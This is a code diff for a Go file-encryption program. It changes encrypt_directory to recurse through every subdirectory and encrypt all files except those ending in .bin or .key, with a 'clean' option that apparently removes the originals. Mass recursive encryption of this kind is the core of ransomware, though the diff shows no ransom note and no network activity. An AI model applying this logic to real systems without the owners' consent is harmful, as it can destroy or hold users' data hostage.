@@ -1,4 +1,4 @@
-package main
+ package main
 
 import (
 	"crypto/aes"
@@ -106,32 +106,10 @@ func encrypt_directory(key []byte, dir string, clean bool) error {
 
     //loop through all items in directory
 	for _, item := range items {
+		fullpath := filepath.Join(dir, item.Name())
 		if item.IsDir() {
-			subitems, err := os.ReadDir(filepath.Join(dir, item.Name()))
-			if err != nil {
-				fmt.Printf("[-] failed to read subdirectory %s: %v\n", item.Name(), err)
-				continue
-			}
-			for _, subitem := range subitems {
-				if !subitem.IsDir() {
-					sub := filepath.Join(dir, item.Name(), subitem.Name())
-					ext := filepath.Ext(subitem.Name())
-					//filtering files
-					switch ext {
-
-					case ".bin":
-                        fmt.Printf("[-] %v is already encrypted\n", subitem.Name())
-                        
-					case ".key":
-                        fmt.Printf("[-] Cannot encrypt keyfile: %v\n", subitem.Name())
-                        
-					default:
-                        err = encryptData(key, sub, clean)
-                        if err != nil {
-                            return err
-                        }
-					}
-				}
+			if err := encrypt_directory(key, fullpath, clean); err!= nil {
+				return err
 			}
 		} else {
 			//filtering files
@@ -145,7 +123,7 @@ func encrypt_directory(key []byte, dir string, clean bool) error {
 				fmt.Printf("[-] Cannot encrypt keyfile %v\n", item.Name())
 			
 			default:
-				err = encryptData(key, filepath.Join(dir, item.Name()), clean)
+				err = encryptData(key, fullpath, clean)
 				if err != nil {
                     return err
                 }
